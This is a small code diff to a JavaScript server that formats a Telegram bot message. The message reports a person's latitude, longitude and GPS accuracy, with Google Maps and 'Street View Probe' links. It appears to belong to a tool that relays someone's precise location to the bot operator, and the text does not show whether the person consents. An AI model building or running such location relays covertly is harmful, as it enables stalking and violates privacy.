@@ -776,15 +776,17 @@ async function startServer() {
 
       const msg = `<b>${header}</b>\n` +
                   `━━━━━━━━━━━━━━━━━━━━\n\n` +
-                  `🛰️ <b>Coordinates</b>\n` +
-                  `├ Lat: <code>${lat}</code>\n` +
-                  `├ Lon: <code>${lon}</code>\n` +
-                  `└ Acc: <code>${acc} meters</code>\n\n` +
+                  `🛰️ <b>PRECISION POSITIONING</b>\n` +
+                  `├ LATITUDE: <code>${lat}</code>\n` +
+                  `├ LONGITUDE: <code>${lon}</code>\n` +
+                  `├ ACCURACY: <code>±${acc} meters</code>\n` +
+                  `└ FIX_RELIABILITY: <code>${parseInt(acc) < 30 ? 'HIGH' : 'ESTIMATED'}</code>\n\n` +
                   `━━━━━━━━━━━━━━━━━━━━\n` +
-                  `🔗 <b>Navigation</b>\n` +
-                  `🌐 <a href="${mapLink}">View location on Google Maps</a>\n\n` +
+                  `🔗 <b>NAVIGATION LINKS</b>\n` +
+                  `├ 🌐 <a href="${mapLink}">Google Maps View</a>\n` +
+                  `└ 📍 <a href="https://www.google.com/maps/search/?api=1&query=${lat},${lon}">Street View Probe</a>\n\n` +
                   `━━━━━━━━━━━━━━━━━━━━\n` +
-                  `🏁 <i>Status: Spatial verification successful.</i>`;
+                  `🏁 <i>Status: High-precision spatial data synced.</i>`;
 
       botInstance.telegram.sendMessage(chatId, msg, { 
         parse_mode: 'HTML', 
